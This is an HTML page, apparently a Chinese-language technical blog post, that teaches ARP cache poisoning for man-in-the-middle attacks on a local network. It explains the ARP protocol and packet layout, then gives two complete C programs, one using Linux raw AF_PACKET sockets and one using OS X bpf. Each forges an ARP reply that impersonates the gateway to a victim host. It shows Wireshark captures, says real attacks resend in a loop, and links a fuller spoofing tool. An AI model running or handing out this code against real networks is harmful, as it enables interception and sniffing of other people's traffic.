@@ -1,0 +1,685 @@
+<!DOCTYPE html>
+<!--
+Copyright 2015 lngost
+See <https://github.com/lngost>
+-->
+<html>
+    <head>
+        <title>ARP Packet by c</title>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <meta name="description" content="An easy implementation of arp attack.">
+        <meta name="description" content="一个简单的arp攻击实现和原理">
+        
+        <link rel="shortcut icon" href="../../../../images/myL.ico"/> <!-- The shortcut icon -->
+        
+        <!-- Import third party plugins -->
+        <script type="text/javascript" src="../../../../bower_components/jquery/dist/jquery.min.js"></script> <!-- http://jquery.com/ -->
+        <link rel="stylesheet" href="../../../../css/animate.css" /> <!-- http://daneden.github.io/animate.css/ -->
+        <script type="text/javascript" src="../../../../js/jquery.storageapi.min.js"></script> <!-- http://github.com/julien-maurel/jQuery-Storage-API/ -->
+        <link rel="stylesheet" href="../../../../bower_components/bootstrap/dist/css/bootstrap.min.css" /> <!-- http://getbootstrap.com/ -->
+        <script src="../../../../bower_components/bootstrap/dist/js/bootstrap.min.js"></script> <!-- http://getbootstrap.com/ -->
+        <link rel="stylesheet" href="../../../../google-code-prettify/prettify.css" />
+        <script src="../../../../google-code-prettify/prettify.js"></script>
+        <!-- End of third party plugins -->
+        
+        <!-- Import self css and js files -->
+        <script type="text/javascript" src="../../../../js/my-language-jquery.js"></script>
+        <!-- End of self files -->
+        
+        <style>
+            
+            body {
+                font-family: Verdana, "Microsoft YaHei", "微软雅黑", STXihei, "华文细黑";
+            }
+            
+            a:hover,
+            a:link,
+            a:visited {
+                cursor: pointer;
+                text-decoration: none;
+            }
+            
+            .p-resize {
+                font-size: 1.5em;
+            }
+            
+            .disqus_content #disqus_thread {
+                width: 96%;
+                margin: 2% auto;
+            }
+            
+        </style>
+        
+        <script>
+            
+            $(document).ready(function() {
+                prettyPrint();
+            });
+            
+        </script>
+        
+    </head>
+    <body>
+        <div class="container">
+            <br />
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <ol class="breadcrumb language_en">
+                        <li><a href="../../../../" target="_top">Home</a></li>
+                        <li class="bread-li-tech"><a href="../../../articles.html" target="_top">Article - Technology</a></li>
+                        <li class="active">ARP Packet by using c</li>
+                    </ol>
+                    <ol class="breadcrumb language_cn">
+                        <li><a href="../../../../" target="_top">主页</a></li>
+                        <li class="bread-li-tech"><a href="../../../articles.html" target="_top">技术文章</a></li>
+                        <li class="active">ARP欺骗包的制作--c语言</li>
+                    </ol>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <ul class="nav nav-tabs" role="tablist">
+                        <li role="presentation" class="dropdown">
+                            <a class="dropdown-toggle" data-toggle="dropdown"><span class="glyphicon glyphicon-th-list"></span></a>
+                            <ul class="dropdown-menu" role="menu">
+                                <li role="presentation">
+                                    <a role="menuitem" tabindex="-1" id="enButton"><h5>English <span class="glyphicon glyphicon-ok"></span></h5></a>
+                                </li>
+                                <li role="presentation">
+                                    <a role="menuitem" tabindex="-1" id="cnButton"><h5>简体中文 <span class=""></span></h5></a>
+                                </li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="row language_en">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <br/>
+                    <div class="alert alert-info" role="alert"><strong>Ooops!</strong> Have no EN version right now... </div>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <br/>
+                    <div class="jumbotron">
+                        <img src="images/arp-protocol.jpg" alt="arp protocol" width="170" height="120">
+                        <h2>ARP欺骗包的制作--c语言</h2>
+                        <p>中间人攻击很难实现吗？</p>
+                        <p>还是易如反掌的简单？</p>
+                        <p>利用ARP欺骗包，轻松实现局域网内中间人攻击；</p>
+                        <p>通过ARP攻击截获流量，为嗅探做准备。</p>
+
+                        <p><small>语言版本: <!--<span class="label label-primary">英</span>--><span class="label label-danger">中</span></small></p>
+                        <p><small>发布日期：2015-09-10</small></p>
+                        <p><small>更新日期：2015-09-10</small></p>
+                        <p><small>作者：<em>lngost</em></small></p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-xs-12 col-sm-9 col-md-9">
+                    <div class="input-group">
+                        <span class="input-group-addon">URL</span>
+                        <input type="url" class="form-control" value="https://lngost.github.io/pages/articles/tech/ARP-Packet-By-c/arp-packet-by-c.html" readonly>
+                    </div>
+                </div>
+            </div>
+
+            <div class="row">
+                <div class="col-xs-12 col-sm-7 col-md-7">
+                    <h1><span class="label label-primary">目录</span></h1>
+                    <div class="list-group">
+                        <a href="#arp-brief" class="list-group-item"><p class="p-resize">1. ARP简单介绍</p></a>
+                        <a href="#arp-intro" class="list-group-item"><p class="p-resize">&nbsp;&nbsp;&nbsp;(a) ARP协议</p></a>
+                        <a href="#arp-attack" class="list-group-item"><p class="p-resize">&nbsp;&nbsp;&nbsp;(b) ARP攻击原理</p></a>
+                        <a href="#before-start" class="list-group-item"><p class="p-resize">2. 开始前的准备</p></a>
+                        <a href="#frame-structure" class="list-group-item"><p class="p-resize">&nbsp;&nbsp;&nbsp;(a) 以太网帧结构</p></a>
+                        <a href="#arp-packet" class="list-group-item"><p class="p-resize">&nbsp;&nbsp;&nbsp;(b) ARP包结构</p></a>
+                        <a href="#hint" class="list-group-item"><p class="p-resize">&nbsp;&nbsp;&nbsp;(c) 编程提示</p></a>
+                        <a href="#platform-linux" class="list-group-item"><p class="p-resize">3. Linux平台 -- AF_PACKET, SOCK_RAW</p></a>
+                        <a href="#platform-osx" class="list-group-item"><p class="p-resize">4. OSX平台 -- bpf (Berkeley Packet Filter)</p></a>
+                        <a href="#libpcap-intro" class="list-group-item"><p class="p-resize">5. 跨平台实现之libpcap介绍</p></a>
+                        <a href="#attach" class="list-group-item"><p class="p-resize">附件：arpspoofmod源码</p></a>
+                    </div>
+                </div>
+            </div>
+
+            <br/>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <h1 id="arp-brief">1. <span class="label label-primary">ARP简单介绍</span></h1>
+                    <br/>
+                    <p class="p-resize" id="arp-intro">(a) ARP协议</p>
+                    <p class="p-resize">* ARP - Address Resolution Protocol，地址解析协议。用来将网络层（第三层）地址，解析为链路层（第二层）地址。</p>
+                    <p class="p-resize">* 在以太网(Ethernet)中，当主机准备发送一个包含目标ip地址的包时，通过查询自身arp缓存表、或发送arp请求包来获取目标主机对应的mac地址，如此就完成了一次地址解析。</p>
+                    <div class="well">
+                        <p class="p-resize">* 通常所说的IP地址即属于网络层地址，而MAC地址、以太网地址等属于链路层地址。</p>
+                        <p class="p-resize">* 目前的局域网主要使用了以太网技术，处在其中的计算机通过以太网帧(Ethernet frame)来通信。以太网帧当中，就包含了通信双方的以太网地址（也称为MAC地址、硬件地址等）。</p>
+                        <p class="p-resize">* 虽然一般情况下每台局域网内的主机都有一个诸如192.168.1.5之类的内网ip地址，但是内网通信时依然需要找到对应的mac地址来进行包的转发，这也就是arp协议的工作了。</p>
+                        <p class="p-resize">* 显然的是，局域网内即使不使用ip协议，依然可以通过以太网协议来通信，所以arp攻击中我们构建的arp包就能够被对方接收到。</p>
+                    </div>
+                    <br />
+                    <p class="p-resize" id="arp-attack">(b) ARP攻击原理</p>
+                    <p class="p-resize">* arp攻击的目的是截获主机之间的通信流量，比如一台计算机和网关之间的通信，让原本不经过我们的流量，给他引导过来，然后就可以进行诸如嗅探(sniff)之类的工作了。</p>
+                    <p class="p-resize">* 要怎么做呢？简单地说，就是刷新对方的arp缓存表，让对方通信的原目标mac地址变为我方的mac地址。</p>
+                    <p class="p-resize">* 如何能够刷新对方的arp缓存表？也很简单，发送arp响应包给对方即可，即使对方并没有发送过arp请求。</p>
+                    <div class="well">
+                        <p class="p-resize">* 需要注意的是，arp协议是将ip和mac地址对应转换，倘若2台主机间不使用ip协议来通信，那arp攻击也就失效了。</p>
+                        <p class="p-resize">* 又或者，对方主机使用了静态arp绑定，将ip和mac的对应事先绑定了，那么arp攻击也失效了。</p>
+                        <p class="p-resize">* 当然现实情况是，arp攻击十分有效。许多网络层之上的服务都依赖ip协议，而静态arp绑定也很少有人去做。</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <h1 id="before-start">2. <span class="label label-primary">开始前的准备</span></h1>
+                    <br />
+                    <p class="p-resize" id="frame-structure">(a) 以太网帧结构</p>
+                    <img src="images/ether-frame.jpg" alt="ethernet frame" width="550" height="200" class="img-responsive img-thumbnail" />
+                    <div class="well">
+                        <p class="p-resize">* 以上是简化了的帧结构，去掉了不需要我们手动构建的帧校验序列(FCS)部分。</p>
+                        <p class="p-resize">* 帧类型对于我们使用的arp协议是0x0806</p>
+                        <p class="p-resize">* payload中即存放arp协议的内容。</p>
+                    </div>
+                    <p class="p-resize" id="arp-packet">(b) ARP包结构</p>
+                    <img src="images/arp-packet.jpg" alt="arp packet" width="550" height="420" class="img-responsive img-thumbnail" />
+                    <div class="well">
+                        <p class="p-resize">* 硬件类型，一般以太网设备为0x0001</p>
+                        <p class="p-resize">* 协议类型，虽然名称不一样，但可选择的值是和帧类型共用的，这里对应ip协议为0x0800</p>
+                        <p class="p-resize">* 硬件地址长度，0x06代表6个字节长</p>
+                        <p class="p-resize">* 协议地址长度，0x04</p>
+                        <p class="p-resize">* 操作，发送arp请求包为0x0001，发送arp响应包为0x0002</p>
+                        <p class="p-resize">* 剩下的就是地址没什么特别的</p>
+                    </div>
+                    <p class="p-resize" id="hint">(c) 编程提示</p>
+                    <p class="p-resize">* 我们将分别在Linux和OSX这两个平台上编写和讲解代码。</p>
+                    <p class="p-resize">* 需注意这两个平台均遵循POSIX协议，有很多预定义的部分可以共用。</p>
+                    <p class="p-resize">* 唯一区别在于直接发送链路层封包所用的方式不同：</p>
+                    <p class="p-resize">Linux中我们使用AF_PACKET和SOCK_RAW创建socket来发送链路层包；</p>
+                    <p class="p-resize">OSX中没有预定义AF_PACKET，所以直接使用bpf发送链路层包。</p>
+                    <p class="p-resize">* 文章最后介绍libpcap，一个跨平台的网络数据包处理的函数库。</p>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <h1 id="platform-linux">3. <span class="label label-primary">Linux平台 -- AF_PACKET, SOCK_RAW</span></h1>
+<pre>
+* 网关(gateway)位置：ip: 192.168.1.1
+</pre>
+<pre>
+* 目标(victim)平台信息：known ip: 192.168.1.3
+</pre>
+<pre>
+* 我方(attacker)平台信息：Ubuntu_14.04_desktop_x86_64 GNU/Linux
+$ ifconfig
+eth0     Link encap:Ethernet   HWaddr aa:aa:aa:aa:aa:aa
+         inet addr:192.168.1.2   Bcast:192.168.1.255   Mask:255.255.255.0
+         ...
+
+ARP reply packet captured by Wireshark:
++----------------------------------------------------------------------------------------------------------+
+ Source            | Destination          | Protocol    | Length   | Info
++----------------------------------------------------------------------------------------------------------+
+ Gateway_cc:cc:cc  | aa:aa:aa:aa:aa:aa    | ARP         | 42       | 192.168.1.3 is at bb:bb:bb:bb:bb:bb
++----------------------------------------------------------------------------------------------------------+
+
+* 攻击目的：将由victim流向gateway方向的通信截获。
+* 方法：发送伪造的arp响应包给victim，让其arp缓存表中与gateway的ip对应的mac地址变为我方mac地址。
+</pre>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-8">
+                    <div class="table-responsive">
+                        <table class="table table-bordered">
+                            <tr>
+                                <th>包含的头文件</th>
+                                <th>说明</th>
+                            </tr>
+                            <tr>
+                                <td>
+                                    &lt;stdio.h&gt;<br/>
+                                    &lt;stdlib.h&gt;<br/>
+                                    &lt;string.h&gt;<br/>
+                                    &lt;errno.h&gt;
+                                </td>
+                                <td>一些常用函数和定义</td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    &lt;sys/types.h&gt;<br/>
+                                    &lt;sys/socket.h&gt;
+                                </td>
+                                <td>
+                                    创建socket所需的<samp>socket()函数</samp><br/>
+                                    <samp>AF_PACKET</samp><br/>
+                                    <samp>SOCK_RAW</samp><br/>
+                                    能够发送无连接的数据报的函数 <samp>sendto()</samp>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>&lt;net/ethernet.h&gt;</td>
+                                <td>
+                                    以太网帧: <samp>struct ether_header</samp><br/>
+                                    <samp>ETHERTYPE_ARP</samp><br/>
+                                    <samp>ETHER_ADDR_LEN</samp>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>&lt;netinet/if_ether.h&gt;</td>
+                                <td>
+                                    ARP包: <samp>struct ether_arp</samp><br/>
+                                    <samp>ARPHRD_ETHER</samp><br/>
+                                    <samp>ETHERTYPE_IP</samp><br/>
+                                    <samp>ARPOP_REPLY</samp><br/>
+                                    包含了来自&lt;linux/if_ether.h&gt;的 <samp>ETH_P_ARP</samp>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>&lt;arpa/inet.h&gt;</td>
+                                <td>主机字节至网络字节顺序转换函数 <samp>htons()</samp></td>
+                            </tr>
+                            <tr>
+                                <td>&lt;netpacket/packet.h&gt;</td>
+                                <td>供AF_PACKET socket使用的sockaddr: <samp>struct sockaddr_ll</samp></td>
+                            </tr>
+                            <tr>
+                                <td>&lt;net/if.h&gt;</td>
+                                <td>通过本机网络接口名称获取接口索引号的函数 <samp>if_nametoindex()</samp></td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+<pre class="prettyprint lang-c linenums">
+// arp poison packet sample on linux by <em>lngost</em>
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;net/ethernet.h&gt;
+#include &lt;netinet/if_ether.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;netpacket/packet.h&gt;
+#include &lt;net/if.h&gt;
+
+// const items
+const char INTERFACE[] = "eth0";
+const u_char TARGET_MAC[] = {0xbb,0xbb,0xbb,0xbb,0xbb,0xbb}; //victim's mac
+const u_char SOURCE_MAC[] = {0xaa,0xaa,0xaa,0xaa,0xaa,0xaa}; //attacker's mac
+const u_char TARGET_IP[] = {192,168,1,3};                    //victim's ip
+const u_char SOURCE_IP[] = {192,168,1,1};                    //gateway's ip, 这里很重要，因为我们要假装是网关，所以用网关的ip
+
+// main function
+int main(int argc, char **argv) {
+    int soc;
+    u_char frame[42];        //total length of ethernet head plus arp packet is 42 octets
+
+
+    // create socket -- 创建socket(套接字)
+    soc = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
+    if(soc == -1) {
+        perror("socket() failed");
+        exit(EXIT_FAILURE);
+    }
+    printf("* Socket created.\n");
+
+    
+    // create arp frame -- 构建arp帧，其实就是将以太网头部和arp包组合，存入frame[]，前14字节为以太网头，后28字节为arp包
+    // 这里使用了2个预先定义好的struct，很方便，不需要我们自己纯手工构建arp帧了
+    struct ether_header ehead;
+    struct ether_arp earp;
+
+    memcpy(ehead.ether_dhost, TARGET_MAC, ETHER_ADDR_LEN);
+    memcpy(ehead.ether_shost, SOURCE_MAC, ETHER_ADDR_LEN);
+    ehead.ether_type = htons(ETHERTYPE_ARP);
+
+    earp.arp_hrd = htons(ARPHRD_ETHER);
+    earp.arp_pro = htons(ETHERTYPE_IP);
+    earp.arp_hln = ETHER_ADDR_LEN;
+    earp.arp_pln = 4;
+    earp.arp_op = htons(ARPOP_REPLY);
+    memcpy(earp.arp_sha, SOURCE_MAC, ETHER_ADDR_LEN);
+    memcpy(earp.arp_spa, SOURCE_IP, 4);
+    memcpy(earp.arp_tha, TARGET_MAC, ETHER_ADDR_LEN);
+    memcpy(earp.arp_tpa, TARGET_IP, 4);
+
+    memcpy(frame, &amp;ehead, sizeof(ehead));
+    memcpy(frame + sizeof(ehead), &amp;earp, sizeof(earp));
+    printf("* ARP frame created.\n");
+
+
+    // make sockaddr_ll ready for sendto() function -- 用作sendto()函数中的参数，此处主要是指定一个网络接口
+    struct sockaddr_ll destaddr;
+    destaddr.sll_family = AF_PACKET;
+    if((destaddr.sll_ifindex = if_nametoindex(INTERFACE)) == 0) {
+        perror("if_nametoindex() failed");
+        exit(EXIT_FAILURE);
+    }
+    destaddr.sll_halen = htons(ETHER_ADDR_LEN);
+    printf("* struct sockaddr_ll destaddr ready.\n");
+
+
+    // send packet to poison -- 将我们之前伪造好的arp响应包发送出去
+    if(sendto(soc, frame, sizeof(frame), 0, (struct sockaddr *)&amp;destaddr, sizeof(destaddr)) == -1) {
+        perror("sendto() failed");
+        exit(EXIT_FAILURE);
+    }
+    printf("* Packet sent.\n");
+
+
+    // close socket -- 完成后关闭socket
+    close(soc);
+    printf("* Socket closed.\n");
+
+    return 0;
+}
+
+
+</pre>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <p class="p-resize">* 编译并运行，linux下通常需要root权限或者使用sudo来发送链路层包，否则会提示权限错误。</p>
+                    <p class="p-resize">* 至此我们就完成了一次arp响应包的发送，如果victim用Wireshark抓包的话，就可以看到抓到的包是这个样子的：</p>
+<pre>
+ARP reply packet captured by Wireshark:
++----------------------------------------------------------------------------------------------------------+
+ Source            | Destination          | Protocol    | Length   | Info
++----------------------------------------------------------------------------------------------------------+
+ aa:aa:aa:aa:aa:aa | bb:bb:bb:bb:bb:bb    | ARP         | 42       | 192.168.1.1 is at aa:aa:aa:aa:aa:aa
++----------------------------------------------------------------------------------------------------------+
+* 就是由 aa:aa:aa:aa:aa:aa 发往 bb:bb:bb:bb:bb:bb 的arp包，告诉 bb:bb:bb:bb:bb:bb ，192.168.1.1 在 aa:aa:aa:aa:aa:aa 这里。
+</pre>
+                    <p class="p-resize">* 需注意的是，以上代码仅仅发送了一次arp包，而现实攻击中往往需要循环地发送以防止arp缓存被其他主机更新，比如网关。</p>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <h1 id="platform-osx">4. <span class="label label-primary">OSX平台 -- bpf (Berkeley Packet Filter)</span></h1>
+<pre>
+* 网关(gateway)位置：ip: 192.168.1.1
+</pre>
+<pre>
+* 目标(victim)平台信息：known ip: 192.168.1.3
+</pre>
+<pre>
+* 我方(attacker)平台信息：OS_X_10.10_Yosemite
+$ ifconfig
+en0:     ...
+         ether aa:aa:aa:aa:aa:aa
+         inet 192.168.1.2  netmask 0xffffff00  broadcast 192.168.1.255
+         ...
+
+ARP reply packet captured by Wireshark:
++----------------------------------------------------------------------------------------------------------+
+ Source            | Destination          | Protocol    | Length   | Info
++----------------------------------------------------------------------------------------------------------+
+ Gateway_cc:cc:cc  | aa:aa:aa:aa:aa:aa    | ARP         | 42       | 192.168.1.3 is at bb:bb:bb:bb:bb:bb
++----------------------------------------------------------------------------------------------------------+
+
+* 攻击目的：将由victim流向gateway方向的通信截获。
+* 方法：发送伪造的arp响应包给victim，让其arp缓存表中与gateway的ip对应的mac地址变为我方mac地址。
+</pre>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-8">
+                    <div class="table-responsive">
+                        <table class="table table-bordered">
+                            <tr>
+                                <th>包含的头文件</th>
+                                <th>说明</th>
+                            </tr>
+                            <tr>
+                                <td>
+                                    &lt;stdio.h&gt;<br/>
+                                    &lt;stdlib.h&gt;<br/>
+                                    &lt;string.h&gt;<br/>
+                                    &lt;errno.h&gt;
+                                </td>
+                                <td>一些常用函数和定义</td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    &lt;sys/types.h&gt;<br/>
+                                    &lt;sys/time.h&gt;<br/>
+                                    &lt;sys/ioctl.h&gt;<br/>
+                                    &lt;net/bpf.h&gt;<br/>
+                                    &lt;sys/socket.h&gt;<br/>
+                                    &lt;net/if.h&gt;
+                                </td>
+                                <td>
+                                    查询 <samp>man bpf</samp> 得出的需要包含的头文件；<br/>
+                                    包括对设备io通道进行管理的函数 <samp>ioctl()</samp><br/>
+                                    另外，使用 <samp>BIOSETIF</samp> 需包含 <samp>&lt;sys/socket.h&gt;</samp> 和 <samp>&lt;net/if.h&gt;</samp><br/>
+                                    <samp>ioctl</samp> 需要用到的 <samp>struct ifreq</samp>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>
+                                    &lt;unistd.h&gt;<br/>
+                                    &lt;fcntl.h&gt;
+                                </td>
+                                <td>
+                                    打开/dev/bpf*文件所需的open()<br/>
+                                    open()所需参数 O_WRONLY，只写<br/>
+                                    close()<br/>
+                                    write()
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>&lt;net/ethernet.h&gt;</td>
+                                <td>
+                                    以太网帧: <samp>struct ether_header</samp><br/>
+                                    <samp>ETHERTYPE_ARP</samp><br/>
+                                    <samp>ETHER_ADDR_LEN</samp>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>&lt;netinet/if_ether.h&gt;</td>
+                                <td>
+                                    ARP包: <samp>struct ether_arp</samp><br/>
+                                    <samp>ARPHRD_ETHER</samp><br/>
+                                    <samp>ETHERTYPE_IP</samp><br/>
+                                    <samp>ARPOP_REPLY</samp><br/>
+                                </td>
+                            </tr>
+                            <tr>
+                                <td>&lt;arpa/inet.h&gt;</td>
+                                <td>主机字节至网络字节顺序转换函数 <samp>htons()</samp></td>
+                            </tr>
+                        </table>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+<pre class="prettyprint lang-c linenums">
+// arp poison packet sample on osx_10.10 by <em>lngost</em>
+
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;errno.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;sys/time.h&gt;
+#include &lt;sys/ioctl.h&gt;
+#include &lt;net/bpf.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;net/if.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;net/ethernet.h&gt;
+#include &lt;netinet/if_ether.h&gt;
+#include &lt;arpa/inet.h&gt;
+
+//const items
+#define DEV_PLEN 12              //device path length, 设备路径长度。比如"/dev/bpf255"，最长11个字节加最后一位终止符，共12字节
+const char INTERFACE[] = "en0";
+const u_char TARGET_MAC[] = {0xbb,0xbb,0xbb,0xbb,0xbb,0xbb}; //victim's mac
+const u_char SOURCE_MAC[] = {0xaa,0xaa,0xaa,0xaa,0xaa,0xaa}; //attacker's mac
+const u_char TARGET_IP[] = {192,168,1,3};                    //victim's ip
+const u_char SOURCE_IP[] = {192,168,1,1};                    //gateway's ip, 这里也一样，因为我们要假装是网关，所以用网关的ip
+
+//main function
+int main(int argc, char **argv) {
+    int bpf = -1;
+    int devno = 0;
+    char dev[DEV_PLEN];
+    u_char frame[42];
+
+
+    //create arp frame -- 与之前相同，创建一个42字节长的arp帧
+    struct ether_header ehead;
+    struct ether_arp earp;
+
+    memcpy(ehead.ether_dhost, TARGET_MAC, ETHER_ADDR_LEN);
+    memcpy(ehead.ether_shost, SOURCE_MAC, ETHER_ADDR_LEN);
+    ehead.ether_type = htons(ETHERTYPE_ARP);
+
+    earp.arp_hrd = htons(ARPHRD_ETHER);
+    earp.arp_pro = htons(ETHERTYPE_IP);
+    earp.arp_hln = ETHER_ADDR_LEN;
+    earp.arp_pln = 4;
+    earp.arp_op = htons(ARPOP_REPLY);
+    memcpy(earp.arp_sha, SOURCE_MAC, ETHER_ADDR_LEN);
+    memcpy(earp.arp_spa, SOURCE_IP, 4);
+    memcpy(earp.arp_tha, TARGET_MAC, ETHER_ADDR_LEN);
+    memcpy(earp.arp_tpa, TARGET_IP, 4);
+
+    memcpy(frame, &amp;ehead, sizeof(ehead));
+    memcpy(frame + sizeof(ehead), &amp;earp, sizeof(earp));
+    printf("* ARP frame created.\n");
+
+
+    // find available bpf device -- 找到空闲的bpf设备
+    while(bpf &lt; 0) {
+        snprintf(dev, DEV_PLEN, "/dev/bpf%d", devno);
+        bpf = open(dev, O_WRONLY);
+        
+        ++devno;
+        if(devno &gt; 255) {
+            printf("/dev/bpf* full.\n");
+            exit(EXIT_FAILURE);
+        }
+    }
+    printf("* /dev/bpf%d available.\n", --devno);
+
+
+    // bound bpf to an interface -- 通过ioctl将bpf与网络接口进行绑定
+    struct ifreq boundif;
+    strncpy(boundif.ifr_name, INTERFACE, strlen(INTERFACE));
+    if(ioctl(bpf, BIOCSETIF, &amp;boundif) &lt; 0) {
+        perror("ioctl() failed");
+        close(bpf);
+        exit(EXIT_FAILURE);
+    }
+    printf("* Interface %s bound.\n", INTERFACE);
+
+
+    // write to bpf -- 直接写入bpf即可发送，因为arp帧的头部已经包含了目标地址信息
+    if(write(bpf, frame, sizeof(frame)) &lt; 0) {
+        perror("write() failed");
+        close(bpf);
+        exit(EXIT_FAILURE);
+    }
+    printf("* Done write to bpf.\n");
+
+
+    close(bpf);
+    return 0;
+}
+
+
+</pre>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <p class="p-resize">* 编译并运行，通常在OSX下只要有访问/dev/bpf的权限即可。</p>
+                    <p class="p-resize">* 同样，如果victim用Wireshark抓包就能发现我们发送的arp包了。</p>
+                    <p class="p-resize">* 以上代码也是只发送了一次arp包，现实攻击中往往需要循环发送。</p>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <h1 id="libpcap-intro">5. <span class="label label-primary">跨平台实现之libpcap介绍</span></h1>
+                    <p class="p-resize">* 从以上代码可以发现，虽然共同遵守POSIX标准，但其提供的接口还是不一样的(只是提供的接口不一样，底层还是一样的，AF_PACKET其实还是使用了bpf，但linux上不直接提供bpf接口)。</p>
+                    <p class="p-resize">* 因此想要跨平台实现的话，可以使用libpcap函数库。</p>
+                    <p class="p-resize">* libpcap提供了发送、接收、过滤等一系列接口，用于完成一个相对完善的arp攻击工具是足够了。</p>
+                    <p class="p-resize">* 比如一个相对完善的arp攻击工具差不多有这些功能：</p>
+                    <p class="p-resize">主机发现；</p>
+                    <p class="p-resize">主动发送arp请求包获取目标mac地址；</p>
+                    <p class="p-resize">接收过滤返回的arp响应包得到目标mac地址；</p>
+                    <p class="p-resize">循环arp包的发送；</p>
+                    <p class="p-resize">攻击结束后还原目标arp缓存表；</p>
+                    <p class="p-resize">如果还能够实现转发功能就更好了。</p>
+                </div>
+            </div>
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <h1 id="attach">附件：<span class="label label-primary">arpspoofmod源码</span></h1>
+                    <p class="p-resize">* arpspoofmod实现了以下几点：</p>
+                    <p class="p-resize">主动发送arp请求包获取目标mac地址；</p>
+                    <p class="p-resize">接收过滤返回的arp响应包得到目标mac地址；</p>
+                    <p class="p-resize">循环arp包的发送；</p>
+                    <p class="p-resize">截获单向或双向通信流量；</p>
+                    <p class="p-resize">攻击结束后还原目标arp缓存表。</p>
+                    <p class="p-resize">* 源码链接：<a href="https://github.com/lngost/arpspoofmod" target="_blank">https://github.com/lngost/arpspoofmod</a></p>
+                    
+                    <br />
+                    <h1><span class="label label-primary">(The End)</span></h1>
+                </div>
+            </div>
+            
+            <br />
+            
+            <div class="row">
+                <div class="col-xs-12 col-sm-12 col-md-12">
+                    <div class="disqus_content">
+                        <div id="disqus_thread"></div>
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = 'arppacketbyc';
+    
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+                    </div>
+                </div>
+            </div>
+            
+        </div>
+    </body>
+</html>
